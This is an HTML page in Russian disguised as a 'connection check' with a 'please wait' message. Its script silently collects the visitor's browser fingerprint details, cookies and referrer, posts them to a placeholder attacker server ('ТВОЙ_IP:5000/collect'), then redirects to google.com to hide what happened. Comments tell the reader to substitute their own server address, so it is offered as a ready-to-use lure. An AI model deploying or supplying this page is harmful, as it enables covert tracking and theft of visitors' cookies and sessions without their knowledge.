<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Проверка соединения</title>
</head>
<body>
    <h1>Пожалуйста, подождите...</h1>
    <script>
        // Сбор данных
        const data = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenWidth: screen.width,
            screenHeight: screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookies: document.cookie,
            referrer: document.referrer
        };

        // Отправка на твой сервер (замени IP на реальный адрес твоего сервера)
        fetch('http://ТВОЙ_IP:5000/collect', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data)
        }).then(() => {
            // После отправки перенаправляем на безобидную страницу
            window.location.href = 'https://google.com';
        }).catch(() => {
            window.location.href = 'https://google.com';
        });
    </script>
</body>
</html>
